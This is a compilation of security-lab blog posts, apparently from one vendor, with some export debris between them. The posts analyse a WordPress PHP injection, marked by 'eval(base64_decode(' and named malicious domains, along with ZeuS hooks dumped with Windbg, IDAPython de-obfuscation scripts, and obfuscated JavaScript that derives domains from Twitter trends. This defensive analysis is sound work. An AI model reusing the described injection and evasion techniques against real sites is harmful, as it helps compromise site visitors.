ngram_freq:\n            ngram_freq[j] += 1 \n        else:\n            ngram_freq[j] = 1 # human counting numbers start at 1\n\n    # set reverse = False to change order of sort (ascending/descending)\n    return sorted(ngram_freq.iteritems(), key=itemgetter(1), reverse=True)\n\nif __name__ == \'__main__\':\n    inputstring = raw_input(\'Enter input string: \')\n    nlen_str = raw_input(\'Enter size of n-gram (int): \')\n    nlen = int(nlen_str) # cast string to int\n    \n    for t in calc_ngram(inputstring, nlen):\n        print t[0] + \' occurred \' + str(t[1]) + \' times\'', 'https://www.forcepoint.com/blog/security-labs/simple-n-gram-calculator-pyngram\n');

Dancho Danchev reported a domain which is related to this attack at the end of last month. The domain kdjkfjskdfjlskdjf.com is directly related to the ongoing attacks and still appears on injected sites. Another set of domains is losotrana.com, holasionweb.com, indesignstudioinfo.com and zettapetta.com.\nChecking the number of hits with our ThreatSeeker ™ network over this past weekend revealed more than 23,000 infected pages with this kind of attack, and it\'s still growing. The malicious code is injected by the attackers into PHP files on the server. Typically an infected PHP file will start with this line of code at the top of it: eval(base64_decode( . Below is a screenshot showing how an infected page looks on an injected server:\n\n\n\nIf you\'re running a Wordpress installation it\'s highly recommended to check every PHP file for a possible injection.\n\nThe injected code is encoded with Base64. Once you decode the content you get this output:\n\n\n\nThe code above isn\'t very complex. First it makes sure some functions that it needs exist; if not, it creates them. The malicious code starts with ob_start that points to the mrobh function. This means that any output from the Web page will be buffered first (i.e. not rendered yet). In case the page is encoded with GZIP, the script tries to decode the page using its inbuilt GZIP decompression function gzdecode. Now that it\'s sure that the buffered content is clear, there is an attempt to match on a closing body tag </body>. If there\'s a match then the script (which resides encoded in the gml function) will be injected just before the </body> tag. If there\'s no </body> tag then the script will be injected at the end of the page. The gml function holds the injected script, decoded in Base64, but before delivering the script the function checks whether either Google or Yahoo search crawlers are visiting the page. If either of these two visit the page, the script will not be delivered. The reason why the attackers do this is simple: they don\'t want the search engines to pick up on their malicious activities.\n\nThe injected scripts lead to Web sites with a very low reputation that bring all sorts of mayhem: pharmaceutical spam, fake software shops, exploit sites, Zeus C&C sites, and last but not least, fake passports/fake documents sites.

This past month, we presented at both EUSecWest in Amsterdam and SyScan in Singapore. \n  If you missed us there, not to worry, in just a few weeks we are presenting at Black Hat and DEF CON, both in Las Vegas. Come say hi to us!\nMajor hits\nEvery major event and news item is followed very closely by exploiters looking to achieve some profit. It may be the death of a celebrity or a major event such as FIFA World Cup; the bad guys are always there. With the World Cup still ongoing, we continue to see targeted attacks of known zero-day pdf vulnerabilities, the infamous 419 scam letters, phishing attempts, and of course the more popular than ever Blackhat SEO scareware campaigns.\n  More than 100k popular Web sites were compromised last month with a mass injection targeting IIS using ASP.net platform. The attack came from Chinese IP addresses and the injected iFrame led to a Chinese-hosted domain http://www.ro[REMOVED]nt.us serving juicy Mal/Behav-290 malware. The majority of Web sites were cleaned up in matter of hours.\n  Apple, Inc. was accused of a data breach resulting in the loss of 100k email addresses and ICC-ID numbers. A few hours later the finger was pointed to the real miscreant. An AT&T designed and secured Web application allowed the Goatse hacker group to match ICC-IDs with email addresses used by iPad users to access their iTunes accounts. Observations? If you are a developer, carefully design and review for security and secure coding practices. If you are a hacker, do not irritate a giant without very good armor. \nWeb 2 dot uh oh\nIt seems like everyone on the Web today is trying to figure out how to leverage social networking tools (Facebook, Twitter) for \"viral\" marketing. Even the bad guys. This month, the baddies used a clever combination of social and technical tricks to increase their own reputation and get over 15,000 people to \'like\' them on Facebook. The social-engineering trick started off with a lure (as they all do) to see the \"best passport application rejection in history\". Behind the scenes, an invisible Facebook \'like\' button follows your mouse cursor, guaranteeing that you\'ll click on the Facebook \'like\' button regardless of where you click on the malicious web site. The consequence of clicking the hidden \'like\' button is that a link to this web site is posted on your Facebook profile for all your friends to see - and if they too click on it, the cycle repeats itself. \n  In a separate Facebook scam involving the lure \'Teacher nearly killed this boy\', a rogue Facebook app requested permission to access the viewer\'s profile information, and permission to post content on the viewer\'s Facebook wall. Users who don\'t pay attention and simply click through to get to the video risk the safety of their Facebook friends should they click on something malicious that could be posted by the rogue app from the viewer\'s wall.\n  A persistent cross-site scripting (XSS) vulnerability was discovered on Twitter. You may recall a similar incident some time ago, but whereas the previous case involved the application URL, this time around it involves the application name.\n  A study by ISACA, an international organization that researches IT governance and control just published a research paper that listed viruses and malware, brand hijacking, and lack of control over corporate content as some of the top risks faced by companies using Web 2.0 social media tools. \n  Is that any surprise?\nBrowser & friends\nAdobe made a big splash in the security market this month. New zero-day vulnerability (CVE-2010-1297) was discovered early in the month. A few days later PDF samples embedded with a SWF file exploiting the vulnerability were found in the wild. The samples spread as an email attachment. And then html pages with exploited SWF files arrived. The more convenient method has been used to attack customers. Details about the zero-day vulnerability can be found here.\n  In the middle of the month Adobe released a security update for Flash Player that fixes 31 vulnerabilities, including the zero-day vulnerability. At the end of the month Adobe released a security update for Adobe Reader and Acrobat to fix the zero-day vulnerability. You should update your Flash Player and Adobe Reader as soon as possible. Mozilla released 8 security advisories this month, several critical vulnerabilities were fixed in the recent Firefox update. A new feature called Crash Protection, also known as OOPP(Out Of Process Plug-ins) has been added to Firefox 3.6.4. With this feature, the plug-in process is isolated from the browser process. This makes the browser more stable because a plug-in crash should not affect the browser. Apple has patched 48 vulnerabilities for Safari and WebKit.\nMicrosoft\nThe two big events this month were Microsoft\'s busy Patch Tuesday, addressing 34 vulnerabilities, and a zero-day POC released by a Google security researcher.\n  Among the many fixes this month, Microsoft fixed the SharePoint XSS bug from April and a publicly disclosed data leakage vulnerability in Internet Explorer.  Other vulnerabilities affect Windows, Office, Internet Explorer, and the IIS Web server.\n  Tavis Ormandy, a security researcher at Google, released a zero-day exploit in the Windows Help and Support Center that allows remote code execution.  Tavis posted exploitation details to the Full Disclosure list just a few days after notifying Microsoft of the vulnerability.  Microsoft released and discussed an advisory on the issue, including a workaround to disable the HCP protocol being exploited until a patch is released.\nHello ThreatSeeker. You\'ve got mail!\nDelivering Web sites as an attachment via email is a bit like snail-mailing someone a newspaper clipping when you can just send them the URL. As silly and inefficient as that may be, if the method delivers, then it\'s well worth it. And that\'s exactly what the malicious hackers did: deliver malicious Web sites as an attachment via email. In this incident, victims were told their computers were infected and that they needed to open the attachment \"Virus Scan.html\". This resulted in the computer downloading a malicious PDF and Java .jar file.\n  The bad guys also capitalized on the official launch of the much anticipated iPhone 4 by delivering scams via email and also posting them on Facebook. The lure enticed users with the chance of receiving a free iPhone 4 (yes, some offers on the Internet are just too good to be true. Always proceed with caution!)\n  Other assorted unhealthy snacks served up via email this month included the following themes:\nReset your Twitter password - malicious link to fake AV\n  FIFA World Cup South Africa... bad news - malware attachment in a \"news.html\" file\n  Account verification (yeah, this one\'s subject line is boring in comparison) - malicious link to malware and exploits\n  Notice of Underreported Income (masquerading as from the IRS) - malicious link to fake site and malware\n\n \nSecurity Trends\nJoanna Rutkowska, who is known for her work on virtualization security and low-level rootkits, is building a project named  Qubes, which is an open-source OS meant to provide isolation of the OS components for better security.\n  At the Syscan\'10 Singapore conference, security researchers from TEHTRI-Security published twelve zero-day flaws targeting five of the most common Web malware exploitation kits, such as Neon, Eleonore, Liberty, Lucky, and the Yes exploitation kits.\n  It was observed in a specific malicious spam campaign, that the malicious HTML file attachment used the same obfuscation algorithm as a known mass injection attack on the web.\n\n  This month\'s contributors:\nLei Li\n  Ulysses Wang\n  Erik Buchanan\n  Ivan Sabo\n  Jay Liew', 'https://www.forcepoint.com/blog/security-labs/month-threat-webscape-april-2010\n');

First the JavaScript in the HTML page checks if Adobe Reader is exploitable by checking its version number. The version should be between 7 and 7.1.4, 8 and 8.1.7, or 9 and 9.4. When a vulnerable version is found, the exploit downloads the malicious PDF file and as it is loaded by Adobe Reader, the malicious ActionScript in the file is executed automatically. The PDF itself contains an obfuscated ActionScript that utilizes one of the three different PDF exploits it hides. These are CVE-2009-4324, CVE-2007-5659, and  CVE-2009-0927.

In this article, we will go through the procedure for separating the ZeuS part from the other parts. With the extracted binary data, we can apply a disassembling process using IDA. You may wonder if it\'s possible to disassemble the image taken out from the process dump. In this case, the ZeuS variant was injecting a valid DLL file into the process, and somehow managed to hide the existence of the DLL so that it would not appear in the loaded modules list. We can locate that image and can take it out using some tricks.\nIn the previous article, we found that the following APIs were hooked:\n\nws2_32.dll:\n  send, WSASend, closesocket\nwininet.dll:\n  InternetCloseHandle, HttpSendRequestA, HttpQueryInfoA, InternetReadFile, InternetQueryDataAvailable, HttpSendRequestExW, InternetReadFileExA, HttpSendRequestW, HttpSendRequestExA\ncrypt32.dll:\n  PFXImportCertStore\nuser32.dll:\n  TranslateMessage, DefWindowProcW, NtUserBeginPaint, NtUserEndPaint, DefWindowProcA, GetClipboardData\nntdll.dll:\n  ZwCreateThread, NtQueryDirectoryFile\n\nWith the list of hooked APIs in mind, open the process dump file using Windbg. Then use the \"u\"(disassemble) command to check the first instructions they have. Below are some of the examples:\n\n\n  0:000> u ws2_32!send L1\n  ws2_32!send:\n  71ab428a e911990c8f jmp 00b7dba0\n  0:000> u ws2_32!WSASend L1\n  ws2_32!WSASend:\n  71ab6233 e985790c8f jmp 00b7dbbd\n  …\n  0:000> u crypt32!PFXImportCertStore L1\n  crypt32!PFXImportCertStore:\n   77aef748 e9f7e50889 jmp 00b7dd44\n  …\n  0:000> u ntdll!ZwCreateThread L1\n  ntdll!ZwCreateThread:\n  7c90d7d2 e955962784 jmp 00b86e2c\n  0:000> u ntdll!NtQueryDirectoryFile L1\n  ntdll!NtQueryDirectoryFile:\n  7c90df5e e927902784 jmp 00b86f8a\n\n \nFrom the installed inline hooks, we can get the memory region where the hooking function is installed. Here is one of the \"!address\" results from the hooking function\'s addresses:\n \n0:000> !address 00b7dd44\n00b70000 : 00b70000 - 00026000\nType 00020000 MEM_PRIVATE\nProtect 00000040 PAGE_EXECUTE_READWRITE\nState 00001000 MEM_COMMIT\nUsage RegionUsageIsVAD\n \nThe memory region starts from 0xb70000 and the size is 0x26000 bytes. Let\'s just dump the start of the memory region using the \"db\" command, which dumps memory by bytes.\n\n  \n\nYes, we got the start of the PE file. We can see the \'MZ\' signature and some part of DOS header of the PE file. What we have to do now is simply dump the memory region to a file. Windbg provides a command called \".writemem\" to write memory regions to a file.\nThe following command dumps the region of memory to the file \" C:\\Malwares\\00b70000.bin\".\n \n0:000> .writemem C:\\Malwares\\00b70000.bin b70000 L26000\nWriting 26000 bytes............................................................................\n \nWe open the file using IDA. It seems to be successful, until we find that there is something wrong with the disassembly listing.\n\nFirst we get some error message dialog boxes:\n\n\nFigure 1: Virtual Address Translation Error\n\nWe see that the imports table is empty:\n\n\nFigure 2: Empty Imports Table\n\nEven call instructions are referencing some invalid addresses:\n\n\nFigure 3: Call Referencing Invalid Region\n\nWe notice broken data referencing:\n\n\n\nThis is happening because the base address for image loading is different from what is set in the PE header. We can check the value of the image base defined in the PE header by looking at the top of the IDA disassembly listing. In this case, the image base is set as 0x400000 as you can see from the following picture, but the image base when we dumped the image was actually 0xb70000.\n\n\nFigure 4: Image Base is 0x400000\n\nWill only fixing the image base solve the issues? No. We need to take care of the section relocations. When the PE file is loaded into the process address space, it is not just copied exactly. The sections inside are located according to their virtual address. Each section has their position and size in the physical file, and also has a virtual address region to be mapped. All the information is inside the PE file header.\nWe used the pefile Python module from Ero Carrera to achieve the PE file manipulation. Here\'s the source code for the script that we used:\n\n\n  import pefile\n  import sys\n   \n  filename = sys.argv[1]\n  out_filename = sys.argv[2]\n  rebase_address = int(sys.argv[3],16)\n   \n  pe = pefile.PE(filename)\n  print \"Rebasing from \",hex(pe.OPTIONAL_HEADER.ImageBase),\"to\",hex(rebase_address)\n  pe.OPTIONAL_HEADER.ImageBase = rebase_address\n   \n  for section in pe.sections:\n      section.PointerToRawData = section.VirtualAddress\n   \n  pe.write(out_filename)\n\n \nSave the python script as \"Rebase.py\" file. Here\'s how you can use the script:\n \nc:\\python26\\python Rebase.py 00b70000.bin 00b70000_rebased.bin 0xb70000\n \nThis command will re-base the image base to 0xb70000 and will also correct section location information by setting PointerToRawData to be same as the VirtualAddress value. PointerToRawData is the offset in the file where the section starts. We dumped it from the memory and it should be same as VirtualAddress.\nAfter running the script, open up the re-based image \"00b70000_rebased.bin\" using IDA.\nNow we have a valid and good imports table:\n\n\nFigure 5: Valid Imports Table\n\nCall instructions are referencing valid APIs:\n\n\nFigure 6: Call Instruction Referencing Valid APIs\n\nAlso, the string referencing is corrected and shows good values:\n\n\nFigure 7: Valid String Data\n\nConclusion\nRetrieving injected modules and making it valid for disassembling is possible with a few Windbg tricks and python scripts. Tracing malicious code inside a debugger doesn\'t compare to having it inside a full-blown disassembler. The script presented in this article can be applied to any injected modules in the Windows environment.\nNext time we are going to talk about automated scripts that will do all the jobs that we have done with a single command.\nThanks and have a great reversing!', 'https://www.forcepoint.com/blog/security-labs/extracting-malicious-codes-process-memory-zeus-case\n');

Some time ago you needed to have magic tools from some underground hackers, but the situation has changed a lot since then. This is especially true for reverse engineering on the Windows platform, where there are a lot of good Microsoft-made tools. They are not specifically made for reverse engineering purposes, but they can be very helpful for reverse engineering binaries. They are also very stable because they went through a lot of internal quality assurance processes before being released to the public.\n  It feels like these Microsoft-made tools are underestimated. Many hackers are using ollydbg instead of Windbg. Many people are using some other dumping tools to dump processes instead of userdump. And so on. It\'s not that ollydbg or other tools aren\'t good. I just want to show how easily the same thing can be achieved with the tools released by Microsoft. I\'ll show two things: dumping processes, and finding rootkit components embedded in the process images. Both of these can be achieved with just a few lines of commands.\n  The situation is as follows. We have a machine infected with a malware, a kind of a Zbot variant. We know the malware is doing code injections to collect and control the data flow on the system. So we decide to dump the process image. How can this be achieved with Microsoft tools? We just need to download and install User Mode Process Dumper Version 8.1on the target system. Here\'s an example showing the dump of the infected \"svchost.exe\" process image from the system.\n\n\nIllustration 1: Using userdump to dump live process images\n\nYou just need to call userdump.exe with the target process name and target dump file name. It will go through every process with that specific name and dump the image to a file with the name you designated plus the process ID. In one shot, you can grab all the dump files for each process with same name. Convenient, right? One more benefit of userdump is that it will not kill the process it dumped. So theoretically, the process will not be affected by dumping the images. We can silently duplicate the process images and let the system carry on without intervention.\n  So now we have the corpse images of the processes and it\'s time to do some basic autopsy work to see which organs have been tweaked by this infectious botnet client. First, you need a tool called Debugging Tools for Windows (aka Windbg). There are, however, some issues with the Windbg download. The last release date for the standalone download package is March 2009, which is more than a year ago. You need to download and install WDK to use the latest Windbg. But in my case, I was just fine with the March 2009 release. And the examples here will work without any problems with standalone packages.\n  Just move all the dmp files acquired from userdump to a safe location. Launch Windbg and select File > Open Crash Dump. Then choose the dump file you want to analyze.\n  If you come from the ollydbg world, the first thing you\'ll notice is the UI. It doesn\'t have a fancy GUI like ollydbg. You need to know the debugging commands to achieve anything, even simple things. This can be a big hurdle for the people who are accustomed to full-blown GUI debuggers. But there are still many advantages to this command line approach. You can copy and paste the commands easily. And you can save all the data in a text file for further review. Everything you do inside the debugger is logged, and you can keep those logs as your record. Also Windbg supports a kind of a semi-scripting like the \"Debugger Command Program\", which makes your life easier if you are performing simple tedious repeating tasks.\n  We will use this small portion of the Windbg script feature to find the hooks installed on the target process. The following one-line command will reveal every hook (especially if they are inline hooks):!for_each_module !chkimg @#ModuleName -d!for_each_module is a kind of extension command. Every command that starts with \"!\" is an extension. It executes the following command for every module on the target process.\n  The command to execute for each module is \"!chkimg @#ModuleName -d\". !chkimg is a command that compares the image on the memory and symbol file or executable file. @#ModuleName will be replaced with the module name that is being executed. The command \"!chkimg\" will compare the image with the one in the symbol store. In this case, we should use the symbol store from Microsoft. If you don\'t have your symbol path configured, execute the following command from inside the Windbg command prompt:.sympath+ SRV*C:\\localsymbols*http://msdl.microsoft.com/download/symbols\n  \"C:\\localsymbols\" can be replaced with any local directory that you want to use for symbol cache files.\n  Here\'s the result of that \"!for_each_module\" command with the  \"!chkimg\" command. Basically, it will iterate through all the modules loaded in the process and check the executable image against the one stored in the Microsoft symbol store. If anything has been modified, it will report the discrepancies.\n\n\nIllustration 2: The section inside the red square shows the APIs where the malicious hook is installed\n\nFrom the above picture, you can see that a lot of APIs from ws2_32.dll (winsock) and wininet.dll have been modified. You can quickly see that this malware is monitoring and modifying the network traffic by hooking network-related APIs.\n  For example, let\'s look into WSASend API from the ws2_32.dll file. You can use the \"u\" command to disassemble any portion of the memory. Here, we disassemble the \"WSASend\" API. The first instruction of the API is a jmp instruction to the memory location 0x00b7dbbd.\n\n\nIllustration 3: ws2_32!WSASend inline hook installed\n\nWe disassemble that part of the memory using the  \"u\"(disassemble) command. You can see that it\'s a kind of hooker function.\n\nIllustration 4: Hooker function\n\nBy examining the properties of the memory region containing 0x00b7dbbd using the \"!address\" extension command, we can see that the protection flag has \"Execute\" and \"ReadWrite\" bits set. It\'s usually \"ReadOnly\" with the \"Execute\" bit set for the usual executable modules loaded. This might be a heap region and the hooker module might be injected from another process.\n\n\nIllustration 5: Memory property of region containing the hooker function.\n\nThat\'s it for today. We have showed how to use one-line commands to dump processes, and how to use Windbg to inspect hooks or rootkits installed on the process. The next step will be analyzing the hooker functions themselves. There will be more on this subject in a future blog posting, and it will involve using IDA and IDAPython and the command line version of Windbg.\nThanks, and have a great reversing', 'https://www.forcepoint.com/blog/security-labs/analyzing-malwares-using-microsoft-tools\n');

The same thing is happening on the Internet.  Spammers create new Web sites, then they use all sorts of techniques to deliver those sites to end users. However, in most cases there is a Web/email filtering service like that offered by Websense,  which will analyze and block such sites. At some point such URLs would be blocked by all known companies providing filtering services, and the URLs would become useless for cybercriminals.  The whole process starts again from the beginning: the spammer creates a new page, advertises it and finally it\'s blocked by a Web/email filtering company! Unfortunately spammers have started to come up with new solutions, something we\'re calling \"Recycled\" Spam URLs.\n\"Recycled\" Spam URLs could be created from major services, such as caching or translation, provided by major search engines. Recently in Websense Labs we\'ve seen several spam emails with \"Recycled\" spam links. Some of those emails contain just a link.\n  Others look like legitimate newsletters. Unfortunately ImageShack removed the picture.\n\n  If they follow the link, the user is redirected to a cached version of the site which either had another redirect, or was compromised and had a malicious iframe or code embedded into a source.\n  As shown in this example pages could stay cached for about 2 months or even longer.\n  And finally the landing page - it\'s just another Pharma spam!\n\n  To make it even more difficult for Web/email filtering engines to detect such links,  cybercriminals also are trying to obfuscate links with URL encoding, and in most cases criminals use infrequently-seen Google top level domains belonging to countries such as Anguilla, Gibraltar, American Samoa or the Seychelles. \n \nhxxp://google.com.ai/search?q=cache:www.

The cached version has exactly what they wanted and they start their campaigns. As the site does not exist anymore, search crawlers can\'t pick up the newer version and the cache keeps the last version of the parsed page \"forever\". The same technique is used for compromised sites with good rank: once the site is abused, cybercriminals wait for the site to be cached,  then they remove malicious content and use it in campaigns. The only problem the bad guys face is that high-ranking sites are being parsed with search crawlers very frequently, and the cached version which hosts bad content has a short period of live time.\n  Websense customers are protected, as the Live Analytics are blocking such pages in real time.Security Researchers: Artem Gololobov, Ivan Sabo', 'https://www.forcepoint.com/blog/security-labs/spammers-also-recycle\n');

I was curious as to what kind of tactics and methods had been applied, so I dissected several binaries. I want to share some of my notes about the techniques that these malware programs used. I also want to share some of my analytic techniques and a few of the scripts that I used to help me with the analysis. Most of the obfuscation techniques were in the realm of polymorphism that has been known for years, even decades. I want to show you how a few scripting and graphing tools can ease the burden of de-obfuscating and understanding these malware binaries.\n\n\n	Fake Exports\n\n\n	Yes, fake exports. In this case, an executable was exporting multiple entries, which is unusual. The program exports some random points of the binary with random names, and IDA (Interactive DisAssembler) is so sure that it is a separate function that it breaks up the control flow.\n\n\n	Illustration 1: A function split by exported entry\n\n\n	It\'s very hard to remove a function when it\'s exported. The exported functions tend to have random names. So I wrote a IDAPython script that searches for functions with names that are not auto-generated by IDA, and removes them.\n\n\n	\nimport idaapi  for i in range(0, idaapi.get_func_qty(), 1 ):         func = idaapi.getn_func( i )         name = idaapi.get_func_name( func.startEA )          if name != \'start\' and name[0:4]!=\'sub_\':                 print name,func.startEA, func.flags                 idaapi.del_func( func.startEA )\n\n\n\n	It searches for any function that doesn\'t have name \"start\" or default name prefix \"sub_\". [Update: I got a comment that you can also use GetEntryPointQty()/GetEntryXXX() IDA API to achieve this in more stable fashion]\n\n\n	Visual Interference with NOP repetitions\n\n\n	As I continued through the disassembly, I found that it had a repeating pattern that had no meaning at all. The pattern just pushed a register, modified the same register, and pop it off again. The register did not change at all. This is just a NOP pattern. And it was inserted all over the place, making the analysis very tiresome.\n\n\n	The NOP pattern looked like the following.\n\n\n	\n\n\n	Illustration 2: Repeating NOPs\n\n\n	Actually, the \"db 3eh\" byte is not valid according to IDA[Update: Many folks pointed out that db 3eh doesn\'t mean that it\'s invalid, but meaningless which is more correct word], but the processor didn\'t care. So, all of the red-boxed regions are simply meaningless overhead put there to make the code more overwhelming.\n\n\n	To make analysis easier, I simply replaced all such instances with real NOPs. And I felt a lot better after I did. Here\'s the script that I used. It searches for the \"50 3e 0f c8 58\" byte pattern, which is the hex representation of the NOP parts, and patches in real NOPs(0x90...).\n\n\n	\nimport idaapi import idc  CurrentAddress = idc.MinEA() while 1:         CurrentAddress = idaapi.find_binary( CurrentAddress+1, idc.MaxEA(), \"50 3e 0f c8 58\", 16 , idc.SEARCH_DOWN )         if CurrentAddress == 0xffffffff:                 break         print \"Patching bytes at \", hex( CurrentAddress )          idaapi.patch_many_bytes( CurrentAddress, \"\\x90\\x90\\x90\\x90\\x90\" )\n\n\n\n	Here\'s what I got after the script execution.\n\n\n	Illustration 3: NOPs converted to real NOPs\n\n\n	Basic Block Chunks\n\n\n	The malware had a lot of chunked code, which malware often includes in abundance because it is widely known that IDA doesn\'t deal with it well. Here\'s an example of the chunked code. It\'s heavily split through the binary using jmp instructions.\n\n\n	\n\n\n	Illustration 4: Chunked code using jmps\n\n\n	When you look at it in the graph view, it\'s almost impossible to decipher. IDA failed to create a useful graph.\n\n\n	\n\n\n	Illustration 5: IDA is especially poor in dealing with code chunks.\n\n\n	So I wrote a script called IDAGrapher to do the analysis correctly even with chunked basic blocks. And here\'s the graph that the tool generated. [Update: A person pointed out that you can fix the xrefs to show correct graphs, but in my case it didn\'t work for some reason and my grapher doesn\'t have any additional algorithm to draw the graphs correctly, so I suppose the IDA graph functionality is not perfect or sometimes not adequate for use]\n\n\n	Illustration 6: So it looks much better\n\n\n	It uses power of graphviz (http://www.graphviz.org/) graph tool to generate the graph file.\n\n\n	Packing\n\n\n	I started with malware that was packed and the unpacking routine was obfuscated and I de-obfuscated the unpacking routines. Next I wanted to find out where the original routine starts.\n\n\n	Here\'s a portion of the whole graph. The whole graph is huge; however, I just needed to concentrate on the green blocks. The green blocks are terminal blocks. Terminal blocks can return or jmp to a register assigned location or a stack assigned location. So I may not be able to determine the next control flow easily, but I should be able to determine it dynamically. This means that it\'s a strong candidate for the OEP jumping point.\n\n\n	\n\n\n	Here\'s the zoomed-in shot.\n\n\n	Illustration 8: The block that returns to original routines =\n\n\n	We can see that it\'s returning, but sometimes malware just pushes a jump address onto the stack and uses \"ret*\" instructions to achieve code jumps.\n\n\n	So I placed a break on the specific instruction and executed the binary using the IDA debugger. Here\'s what I got:\n\n\n	\n\n\n	Illustration 9: The point before the jump to original routines\n\n\n	After that, if we \"step over\" the instruction by pressing F8 key, we get this.\n\n\n	\n\n\n	So \"sub_416616\" might be the first function called inside the packed binary. To make it sure, look into the original packed binary, the same location looked like following.\n\n\n	So I can be sure that the binary is unpacked now.\n\n\n	Tracing through the program step-by-step without any idea of the control flow is very tedious and time consuming. The graphical view generated by the simple script helped me know where to put a breakpoint to catch the OEP. In this case, I just had to look into the green blocks.\n\n\n	The source code for this IDA graphing tool is a little bit big, so I put that on the googlecode site. You can grab the code here (http://code.google.com/p/idagrapher/). The code is far from complete. It\'s really just a proof of concept. You can modify the code for your own situation.\n\n\n	Security Researchers: Oh, Matt', 'https://www.forcepoint.com/blog/security-labs/de-obfuscating-obfuscated-binaries-visualization\n');

Most compromised HTML documents contain a JavaScript that generates the malicious content dynamically to make it less obvious what it is doing. To avoid detection, they are using more and more complex obfuscation techniques. In this blog we will analyze a sample with 5 different obfuscation layers using a few tricks to fool automated de-obfuscation engines.\n\nOur sample today is a 6KB obfuscated JavaScript that by the end turns into a single iframe pointing to a malicious site. The threat is using a mixture of Codebook, XOR and substitution ciphering as well as the traditional character representation tricks to hide the malicious content. Some of these techniques have already been discussed in this blog.\nTo decrypt it, we need to tweak the code a little bit so that the evil script reveals its true nature - as opposed to silently executing the payload. As you can see the injected code looks strange, but other than that it does not tell us whether the code is malicious or not:\n\n\nWhat you can see from here is not that much, except you can be sure that the script is obfuscated. For a security expert this kind of code is always highly suspicious as it reveals that the author of the code wanted to hide something for a good reason. If you are indenting the code properly, however, it shows something more to the human eye. Actually you can then divide the code into two parts. In the first part there is only a very short function and a definition of a variable:\n\n\n\nNote that we cut off the value of the variable as it was just too long and is not needed to understand this algorithm. The second part is another function and a call to the first function mentioned above:\n\n\nAs you can see it calls function t() which is only a wrapper around function z(), most probably only to use it as a light anti-de-obfuscation technique. Therefore we need to analyze only the second function. It is very easy to spot that it uses simple substitution ciphering, this time only for the letter \'Z\'. Also it uses char representation coding, where for decoding it only uses the unescape() function. At the end of the script, you can see the eval() function call. This one needs to be replaced with a print() instead in order to display the de-obfuscated code:\n\n\n\nThese are the results, and they are something different from the first layer; however, it all still looks quite cryptic. Many of the malicious JavaScripts today are using multi-level obfuscations. As described in an earlier blog we have to decrypt such code layer by layer. In each layer we can see new details of the code: some of them are valuable during the analysis, some of them are not.\n\nHave you noticed the clear URLs at the bottom? There is definitely something there to investigate. Again, we can use indentation tools (or to use their more fashionable name, code beautifiers) to see what is behind the scenes:\n\n\n\nWe can see the Twitter links, which are clean of course. We could easily come to the wrong conclusion that the script contains only clean URLs, and is therefore not malicious. However, as the bigger part of the script is still cryptic we have to suspect that there is much more behind the scenes.\n\nTo understand why these clean links are there, we should study the Twitter API set a little. In this blog we are not diving too deep into this subject. It\'s enough to know for now that we can include JavaScript APIs from Twitter in order to gather information dynamically from the popular microblog site. With some of these APIs we can then pass the name of a callback function which will then be called from the API. This is a great trick against even the more sophisticated de-obfuscation engines, and also for all black-boxing machines not connected to the Internet - no Internet, no Twitter, therefore no callback.\nThe sample on our plate uses the \'trends.daily\' API which returns the daily trending topics in Twitter. We can easily see the \'callback=\' parameter, which tells us the name of the callback function. Later on, that function will be called automatically with the list of trend topics as a parameter. Also we can see that the format of this list is in JSON, which can be processed very easily by JavaScript.\nIf we look at that code snippet even more closely, we can see that it uses two of these callbacks. The first one is only to determine the date. It also fires up the second callback function, which then utilizes the eval() function in the middle. Note also the following document.write() function, which we will discuss later.\nIn order to be able to decipher this layer, we need to get to the stage where that eval() function is called with the proper parameters. For this we either need to completely emulate the browser environment including Twitter APIs, or need to modify the code a little bit to get over those callback tricks. For the sake of simplicity I just commented out the part of the code that is not needed just now, leaving only the eval() function call (replacing that with a print() of course). Let\'s see what we have:\n\n\nAt this stage we are a bit closer to the finish, but the fun part just starts here. This bit uses global variables previously defined in the upper layers, so we need those. Once we copy over the variable set, we realize that the function named \'cz\' interferes with the variable of the same name. If we quickly look back, we can see that the eval() function that generates this code snippet is embedded into the callback2() function. This means it is in a function context, not global. That\'s why it is no problem for the script to override the original definition of the \'cz\' and redefine it as a function. This trick, however, makes harder to emulate the code.\n\nIn addition to this, it plays with the variable names inside the dw() function to fool simple de-obfuscation engines, which are using context-free grammar only. Furthermore it keeps reusing the variable $a in a nested eval() chain, just for total confusion. Once we solve this level, we get yet another which looks very similar to the previous one; however, there are differences:\n\n\n\nNothing special about this one: it looks like just another layer, except you can see that it also uses an XOR algorithm to increase the level of encryption. Solving this part is very similar to the previous one, so we get into the final level easily, which looks something similar to this:\n\n\n\nNow this part could be a bit confusing as there are loads of things happening here. The good news is that we already can see some valuable information: a decrypted domain name. However, we can also see that there is a dynamic URL generation algorithm at the end. To decrypt it fully, we should tweak the code again in order to get it to work.\n\nBasically we have to remove all the browser-specific code snippets, replacing their return values and variable initializations with static data. This way the script can decipher itself in a non-browser environment. Please note that the function returns different URLs depending on the computed values of the variables. Therefore to get the entire list of URLs, we would need to determine and feed all the possible combinations of the values.\n\nHowever, for this we would need to fully understand the code. The basic idea is that it uses the date as well as character code and the length of the Twitter titles to generate the URL. The sample could create two URLs each day giving a combination of 730 in total throughout the whole year. The algorithm is a true mixture of Cesar and codebook ciphering, as it uses the live Twitter data as a codebook, and then uses this data to calculate a shift value from it. The resulting encrypted text is then used as the domain name for the URL.\n\nFinally, you may notice that there is no eval(), document.write() or any other method in this piece of code to write the data back to the document or otherwise execute the decrypted code. Do you remember that this code is still running inside the callback2() function? There is the document.write($a) right after the eval() which then makes it happen.\n\nAfter all this we got the results: a hidden iframe pointing to a possible malicious site:\n\n \n\nWait a minute, why did we just say \"possible\"? Can\'t we just tell this for sure? Of course we can, once the URL has been correctly generated. However, as the original algorithm generates these URLs from live Twitter data, the URL list can\'t be guessed, not even by the author of this threat. We can, however, mine the existing trends and calculate all the URLs that were used in the past. Other possibilities include predicting the URL using all possible combinations of the shifting value, giving us a huge list of URLs to block.\n\nThis sample is a clear example how cyber criminals are trying to use increasingly advanced tricks to fool automated analysis.

The main vector for spreading Zbot is a spam campaign where recipients are tricked into opening infected attachments on their computer.\nThis new variant uses a malicious PDF file which contains the threat as an embedded file. When recipients open the PDF, it asks to save a PDF file called Royal_Mail_Delivery_Notice.pdf.

